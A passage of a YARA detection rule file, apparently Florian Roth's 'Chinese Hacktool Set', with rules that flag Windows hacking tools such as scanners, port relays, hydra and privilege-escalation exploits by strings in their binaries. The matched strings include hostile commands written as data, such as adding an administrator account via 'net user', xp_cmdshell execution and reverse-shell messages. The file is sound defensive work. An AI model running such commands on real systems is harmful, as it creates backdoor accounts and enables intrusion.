lamescan3.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3130eefb79650dab2e323328b905e4d5d3a1d2f0\"\n\tstrings:\n\t\t$s1 = \"dic\\\\loginlist.txt\" fullword ascii\n\t\t$s2 = \"Radmin.exe\" fullword ascii\n\t\t$s3 = \"lamescan3.pdf!\" fullword ascii\n\t\t$s4 = \"dic\\\\passlist.txt\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3740KB and all of them\n}\n\nrule CN_Tools_pc {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pc.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5cf8caba170ec461c44394f4058669d225a94285\"\n\tstrings:\n\t\t$s0 = \"\\\\svchost.exe\" fullword ascii\n\t\t$s2 = \"%s%08x.001\" fullword ascii\n\t\t$s3 = \"Qy001Service\" fullword ascii\n\t\t$s4 = \"/.MIKY\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Dos_Down64 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Down64.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"43e455e43b49b953e17a5b885ffdcdf8b6b23226\"\n\tstrings:\n\t\t$s1 = \"C:\\\\Windows\\\\Temp\\\\Down.txt\" fullword wide\n\t\t$s2 = \"C:\\\\Windows\\\\Temp\\\\Cmd.txt\" fullword wide\n\t\t$s3 = \"C:\\\\Windows\\\\Temp\\\\\" fullword wide\n\t\t$s4 = \"ProcessXElement\" fullword ascii\n\t\t$s8 = \"down.exe\" fullword wide\n\t\t$s20 = \"set_Timer1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule epathobj_exp32 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file epathobj_exp32.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"ed86ff44bddcfdd630ade8ced39b4559316195ba\"\n\tstrings:\n\t\t$s0 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n\t\t$s1 = \"Exploit ok run command\" fullword ascii\n\t\t$s2 = \"\\\\epathobj_exp\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n\t\t$s3 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n\t\t$s4 = \"Mutex object did not timeout, list not patched\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 270KB and all of them\n}\n\nrule Tools_unknown {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file unknown.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4be8270c4faa1827177e2310a00af2d5bcd2a59f\"\n\tstrings:\n\t\t$s1 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n\t\t$s2 = \"GET /ok.asp?id=1__sql__ HTTP/1.1\" fullword ascii\n\t\t$s3 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii /* PEStudio Blacklist: agent */\n\t\t$s4 = \"Failed to clear tab control Failed to delete tab at index %d\\\"Failed to retrieve\" wide\n\t\t$s5 = \"Host: 127.0.0.1\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 2500KB and 4 of them\n}\n\nrule PLUGIN_AJunk {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file AJunk.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"eb430fcfe6d13b14ff6baa4b3f59817c0facec00\"\n\tstrings:\n\t\t$s1 = \"AJunk.dll\" fullword ascii\n\t\t$s2 = \"AJunk.DLL\" fullword wide\n\t\t$s3 = \"AJunk Dynamic Link Library\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 560KB and all of them\n}\n\nrule IISPutScanner {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IISPutScanner.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9869c70d6a9ec2312c749aa17d4da362fa6e2592\"\n\tstrings:\n\t\t$s2 = \"KERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"ADVAPI32.DLL\" fullword ascii\n\t\t$s4 = \"VERSION.DLL\" fullword ascii\n\t\t$s5 = \"WSOCK32.DLL\" fullword ascii\n\t\t$s6 = \"COMCTL32.DLL\" fullword ascii\n\t\t$s7 = \"GDI32.DLL\" fullword ascii\n\t\t$s8 = \"SHELL32.DLL\" fullword ascii\n\t\t$s9 = \"USER32.DLL\" fullword ascii\n\t\t$s10 = \"OLEAUT32.DLL\" fullword ascii\n\t\t$s11 = \"LoadLibraryA\" fullword ascii\n\t\t$s12 = \"GetProcAddress\" fullword ascii\n\t\t$s13 = \"VirtualProtect\" fullword ascii\n\t\t$s14 = \"VirtualAlloc\" fullword ascii\n\t\t$s15 = \"VirtualFree\" fullword ascii\n\t\t$s16 = \"ExitProcess\" fullword ascii\n\t\t$s17 = \"RegCloseKey\" fullword ascii\n\t\t$s18 = \"GetFileVersionInfoA\" fullword ascii\n\t\t$s19 = \"ImageList_Add\" fullword ascii\n\t\t$s20 = \"BitBlt\" fullword ascii\n\t\t$s21 = \"ShellExecuteA\" fullword ascii\n\t\t$s22 = \"ActivateKeyboardLayout\" fullword ascii\n\t\t$s23 = \"BBABORT\" fullword wide\n\t\t$s25 = \"BBCANCEL\" fullword wide\n\t\t$s26 = \"BBCLOSE\" fullword wide\n\t\t$s27 = \"BBHELP\" fullword wide\n\t\t$s28 = \"BBIGNORE\" fullword wide\n\t\t$s29 = \"PREVIEWGLYPH\" fullword wide\n\t\t$s30 = \"DLGTEMPLATE\" fullword wide\n\t\t$s31 = \"TABOUTBOX\" fullword wide\n\t\t$s32 = \"TFORM1\" fullword wide\n\t\t$s33 = \"MAINICON\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them\n}\n\nrule IDTools_For_WinXP_IdtTool_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file IdtTool.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"07feb31dd21d6f97614118b8a0adf231f8541a67\"\n\tstrings:\n\t\t$s0 = \"\\\\Device\\\\devIdtTool\" fullword wide\n\t\t$s1 = \"IoDeleteSymbolicLink\" fullword ascii  /* Goodware String - occured 467 times */\n\t\t$s3 = \"IoDeleteDevice\" fullword ascii  /* Goodware String - occured 993 times */\n\t\t$s6 = \"IoCreateSymbolicLink\" fullword ascii /* Goodware String - occured 467 times */\n\t\t$s7 = \"IoCreateDevice\" fullword ascii /* Goodware String - occured 988 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 7KB and all of them\n}\n\nrule hkmjjiis6 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hkmjjiis6.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"4cbc6344c6712fa819683a4bd7b53f78ea4047d7\"\n\tstrings:\n\t\t$s1 = \"comspec\" fullword ascii\n\t\t$s2 = \"user32.dlly\" ascii\n\t\t$s3 = \"runtime error\" ascii\n\t\t$s4 = \"WinSta0\\\\Defau\" ascii\n\t\t$s5 = \"AppIDFlags\" fullword ascii\n\t\t$s6 = \"GetLag\" fullword ascii\n\t\t$s7 = \"* FROM IIsWebInfo\" ascii\n\t\t$s8 = \"wmiprvse.exe\" ascii\n\t\t$s9 = \"LookupAcc\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule Dos_lcx {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file lcx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"b6ad5dd13592160d9f052bb47b0d6a87b80a406d\"\n\tstrings:\n\t\t$s0 = \"c:\\\\Users\\\\careful_snow\\\\\" ascii\n\t\t$s1 = \"Desktop\\\\Htran\\\\Release\\\\Htran.pdb\" ascii\n\t\t$s3 = \"[SERVER]connection to %s:%d error\" fullword ascii\n\t\t$s4 = \"-tran  <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n\t\t$s6 = \"=========== Code by lion & bkbll, Welcome to [url]http://www.cnhonker.com[/url] \" ascii\n\t\t$s7 = \"[-] There is a error...Create a new connection.\" fullword ascii\n\t\t$s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n\t\t$s11 = \"-slave  <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n\t\t$s13 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n\t\t$s16 = \"-listen <ConnectPort> <TransmitPort>\" fullword ascii\n\t\t$s17 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n\t\t$s18 = \"[+] Accept a Client on port %d from %s ......\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule x_way2_5_X_way {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file X-way.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"8ba8530fbda3e8342e8d4feabbf98c66a322dac6\"\n\tstrings:\n\t\t$s0 = \"TTFTPSERVERFRM\" fullword wide\n\t\t$s1 = \"TPORTSCANSETFRM\" fullword wide\n\t\t$s2 = \"TIISSHELLFRM\" fullword wide\n\t\t$s3 = \"TADVSCANSETFRM\" fullword wide\n\t\t$s4 = \"ntwdblib.dll\" fullword ascii\n\t\t$s5 = \"TSNIFFERFRM\" fullword wide\n\t\t$s6 = \"TCRACKSETFRM\" fullword wide\n\t\t$s7 = \"TCRACKFRM\" fullword wide\n\t\t$s8 = \"dbnextrow\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and 5 of them\n}\n\nrule tools_Sqlcmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"99d56476e539750c599f76391d717c51c4955a33\"\n\tstrings:\n\t\t$s0 = \"[Usage]:  %s <HostName|IP> <UserName> <Password>\" fullword ascii\n\t\t$s1 = \"=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============\" fullword ascii /* PEStudio Blacklist: os */\n\t\t$s4 = \"Cool! Connected to SQL server on %s successfully!\" fullword ascii\n\t\t$s5 = \"EXEC master..xp_cmdshell \\\"%s\\\"\" fullword ascii\n\t\t$s6 = \"=======================Sqlcmd v0.21 For HScan v1.20=======================\" fullword ascii\n\t\t$s10 = \"Error,exit!\" fullword ascii\n\t\t$s11 = \"Sqlcmd>\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 40KB and 3 of them\n}\n\nrule Sword1_5 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Sword1.5.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"96ee5c98e982aa8ed92cb4cedb85c7fda873740f\"\n\tstrings:\n\t\t$s3 = \"http://www.ip138.com/ip2city.asp\" fullword wide\n\t\t$s4 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n\t\t$s6 = \"ListBox_Command\" fullword wide\n\t\t$s13 = \"md=7fef6171469e80d32c0559f88b377245&submit=MD5+Crack\" fullword wide\n\t\t$s18 = \"\\\\Set.ini\" fullword wide\n\t\t$s19 = \"OpenFileDialog1\" fullword wide\n\t\t$s20 = \" (*.txt)|*.txt\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 400KB and 4 of them\n}\n\nrule Tools_scan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file scan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c580a0cc41997e840d2c0f83962e7f8b636a5a13\"\n\tstrings:\n\t\t$s2 = \"Shanlu Studio\" fullword wide\n\t\t$s3 = \"_AutoAttackMain\" fullword ascii\n\t\t$s4 = \"_frmIpToAddr\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule Dos_c {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file c.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3deb6bd52fdac6d5a3e9a91c585d67820ab4df78\"\n\tstrings:\n\t\t$s0 = \"!Win32 .EXE.\" fullword ascii\n\t\t$s1 = \".MPRESS1\" fullword ascii\n\t\t$s2 = \".MPRESS2\" fullword ascii\n\t\t$s3 = \"XOLEHLP.dll\" fullword ascii\n\t\t$s4 = \"</body></html>\" fullword ascii\n\t\t$s8 = \"DtcGetTransactionManagerExA\" fullword ascii  /* Goodware String - occured 12 times */\n\t\t$s9 = \"GetUserNameA\" fullword ascii  /* Goodware String - occured 305 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule arpsniffer {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file arpsniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"7d8753f56fc48413fc68102cff34b6583cb0066c\"\n\tstrings:\n\t\t$s1 = \"SHELL\" ascii\n\t\t$s2 = \"PacketSendPacket\" fullword ascii\n\t\t$s3 = \"ArpSniff\" ascii\n\t\t$s4 = \"pcap_loop\" fullword ascii  /* Goodware String - occured 3 times */\n\t\t$s5 = \"packet.dll\" fullword ascii  /* Goodware String - occured 4 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 120KB and all of them\n}\n\nrule pw_inspector_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pw-inspector.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"e0a1117ee4a29bb4cf43e3a80fb9eaa63bb377bf\"\n\tstrings:\n\t\t$s1 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n\t\t$s2 = \"Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p \" ascii\n\t\t$s3 = \"PW-Inspector\" fullword ascii\n\t\t$s4 = \"i:o:m:M:c:lunps\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule datPcShare {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file datPcShare.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"87acb649ab0d33c62e27ea83241caa43144fc1c4\"\n\tstrings:\n\t\t$s1 = \"PcShare.EXE\" fullword wide\n\t\t$s2 = \"MZKERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"PcShare\" fullword wide\n\t\t$s4 = \"QQ:4564405\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule Tools_xport {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xport.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"9584de562e7f8185f721e94ee3cceac60db26dda\"\n\tstrings:\n\t\t$s1 = \"Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)\" fullword ascii\n\t\t$s2 = \"Example: xport www.xxx.com 80 -m syn\" fullword ascii\n\t\t$s3 = \"%s - command line port scanner\" fullword ascii\n\t\t$s4 = \"xport 192.168.1.1 1-1024 -t 200 -v\" fullword ascii\n\t\t$s5 = \"Usage: xport <Host> <Ports Scope> [Options]\" fullword ascii\n\t\t$s6 = \".\\\\port.ini\" fullword ascii\n\t\t$s7 = \"Port scan complete, total %d port, %d port is opened, use %d ms.\" fullword ascii\n\t\t$s8 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s9 = \"http://www.xfocus.org\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule Pc_xai {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xai.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f285a59fd931ce137c08bd1f0dae858cc2486491\"\n\tstrings:\n\t\t$s1 = \"Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/\" fullword wide\n\t\t$s2 = \"%SystemRoot%\\\\System32\\\\\" fullword ascii\n\t\t$s3 = \"%APPDATA%\\\\\" fullword ascii\n\t\t$s4 = \"---- C.Rufus Security Team ----\" fullword wide\n\t\t$s5 = \"www.snzzkz.com\" fullword wide\n\t\t$s6 = \"%CommonProgramFiles%\\\\\" fullword ascii\n\t\t$s7 = \"GetRand.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule Radmin_Hash {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file Radmin_Hash.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"be407bd5bf5bcd51d38d1308e17a1731cd52f66b\"\n\tstrings:\n\t\t$s1 = \"<description>IEBars</description>\" fullword ascii\n\t\t$s2 = \"PECompact2\" fullword ascii\n\t\t$s3 = \"Radmin, Remote Administrator\" fullword wide\n\t\t$s4 = \"Radmin 3.0 Hash \" fullword wide\n\t\t$s5 = \"HASH1.0\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule OSEditor {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file OSEditor.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"6773c3c6575cf9cfedbb772f3476bb999d09403d\"\n\tstrings:\n\t\t$s1 = \"OSEditor.exe\" fullword wide\n\t\t$s2 = \"netsafe\" wide\n\t\t$s3 = \"OSC Editor\" fullword wide\n\t\t$s4 = \"GIF89\" ascii\n\t\t$s5 = \"Unlock\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule GoodToolset_ms11011 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file ms11011.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5ad7a4962acbb6b0e3b73d77385eb91feb88b386\"\n\tstrings:\n\t\t$s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n\t\t$s1 = \"OS not supported.\" fullword ascii\n\t\t$s3 = \"Not supported.\" fullword wide  /* Goodware String - occured 3 times */\n\t\t$s4 = \"SystemDefaultEUDCFont\" fullword wide  /* Goodware String - occured 18 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule FreeVersion_release {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file release.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f42e4b5748e92f7a450eb49fc89d6859f4afcebb\"\n\tstrings:\n\t\t$s1 = \"-->Got WMI process Pid: %d \" ascii\n\t\t$s2 = \"This exploit will execute \\\"net user \" ascii\n\t\t$s3 = \"net user temp 123456 /add & net localgroup administrators temp /add\" fullword ascii\n\t\t$s4 = \"Running reverse shell\" ascii\n\t\t$s5 = \"wmiprvse.exe\" fullword ascii\n\t\t$s6 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule churrasco {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file churrasco.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a8d4c177948a8e60d63de9d0ed948c50d0151364\"\n\tstrings:\n\t\t$s1 = \"Done, command should have ran as SYSTEM!\" ascii\n\t\t$s2 = \"Running command with SYSTEM Token...\" ascii\n\t\t$s3 = \"Thread impersonating, got NETWORK SERVICE Token: 0x%x\" ascii\n\t\t$s4 = \"Found SYSTEM token 0x%x\" ascii\n\t\t$s5 = \"Thread not impersonating, looking for another thread...\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}\nrule x64_KiwiCmd {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file KiwiCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"569ca4ff1a5ea537aefac4a04a2c588c566c6d86\"\n\tstrings:\n\t\t$s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n\t\t$s2 = \"Kiwi Cmd no-gpo\" fullword wide\n\t\t$s3 = \"KiwiAndCMD\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 400KB and 2 of them\n}\n\nrule sql1433_SQL {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file SQL.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"025e87deadd1c50b1021c26cb67b76b476fafd64\"\n\tstrings:\n\t\t/* WIDE: ProductName 1433 */\n\t\t$s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 }\n\t\t/* WIDE: ProductVersion 1,4,3,3 */\n\t\t$s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 }\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 90KB and all of them\n}\n\nrule CookieTools2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file CookieTools2.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"cb67797f229fdb92360319e01277e1345305eb82\"\n\tstrings:\n\t\t$s1 = \"www.gxgl.com&www.gxgl.net\" fullword wide\n\t\t$s2 = \"ip.asp?IP=\" fullword ascii\n\t\t$s3 = \"MSIE 5.5;\" fullword ascii\n\t\t$s4 = \"SOFTWARE\\\\Borland\\\\\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule cyclotron {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file cyclotron.sys\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"5b63473b6dc1e5942bf07c52c31ba28f2702b246\"\n\tstrings:\n\t\t$s1 = \"\\\\Device\\\\IDTProt\" fullword wide\n\t\t$s2 = \"IoDeleteSymbolicLink\" fullword ascii  /* Goodware String - occured 467 times */\n\t\t$s3 = \"\\\\??\\\\slIDTProt\" fullword wide\n\t\t$s4 = \"IoDeleteDevice\" fullword ascii  /* Goodware String - occured 993 times */\n\t\t$s5 = \"IoCreateSymbolicLink\" fullword ascii /* Goodware String - occured 467 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3KB and all of them\n}\n\nrule xscan_gui {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file xscan_gui.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"a9e900510396192eb2ba4fb7b0ef786513f9b5ab\"\n\tstrings:\n\t\t$s1 = \"%s -mutex %s -host %s -index %d -config \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \"www.target.com\" fullword ascii\n\t\t$s3 = \"%s\\\\scripts\\\\desc\\\\%s.desc\" fullword ascii\n\t\t$s4 = \"%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l\" ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule CN_Tools_hscan {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"17a743e40790985ececf5c66eaad2a1f8c4cffe8\"\n\tstrings:\n\t\t$s1 = \"%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000\" fullword ascii\n\t\t$s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20\" fullword ascii\n\t\t$s3 = \"%s -h www.target.com -all\" fullword ascii\n\t\t$s4 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n\t\t$s5 = \".\\\\log\\\\Hscan.log\" fullword ascii\n\t\t$s6 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n\t\t$s7 = \"%s@ftpscan#FTP Account:  %s/[null]\" fullword ascii\n\t\t$s8 = \".\\\\conf\\\\mysql_pass.dic\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule GoodToolset_pr {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file pr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"f6676daf3292cff59ef15ed109c2d408369e8ac8\"\n\tstrings:\n\t\t$s1 = \"-->Got WMI process Pid: %d \" ascii\n\t\t$s2 = \"-->This exploit gives you a Local System shell \" ascii\n\t\t$s3 = \"wmiprvse.exe\" fullword ascii\n\t\t$s4 = \"Try the first %d time\" fullword ascii\n\t\t$s5 = \"-->Build&&Change By p \" ascii\n\t\t$s6 = \"root\\\\MicrosoftIISv2\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule hydra_7_4_1_hydra {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file hydra.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"3411d0380a1c1ebf58a454765f94d4f1dd714b5b\"\n\tstrings:\n\t\t$s1 = \"%d of %d target%s%scompleted, %lu valid password%s found\" fullword ascii\n\t\t$s2 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n\t\t$s3 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n\t\t$s4 = \"[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED\" fullword ascii\n\t\t$s5 = \"[ERROR] SMTP LOGIN AUTH, either this auth is disabled\" fullword ascii\n\t\t$s6 = \"\\\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\\\"\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule CN_Tools_srss_2 {\n\tmeta:\n\t\tdescription = \"Chinese Hacktool Set - file srss.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://tools.zjqhr.com/\"\n\t\tdate = \"2015-06-13\"\n\t\thash = \"c418b30d004051bbf1b2d3be426936b95b5fea6f\"\n\tstrings:\n\t\t$x1 = \"used pepack!\" fullword ascii\n\n\t\t$s1 = \"KERNEL32.dll\" fullword ascii\n\t\t$s2 = \"KERNEL32.DLL\" fullword ascii\n\t\t$s3 = \"LoadLibraryA\" fullword ascii\n\t\t$s4 = \"GetProcAddress\" fullword ascii\n\t\t$s5 = \"VirtualProtect\" fullword ascii\n\t\t$s6 = \"VirtualAlloc\" fullword ascii\n\t\t$s7 = \"VirtualFree\" fullword ascii\n\t\t$s8 = \"ExitProcess\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ( $x1 at 0 ) 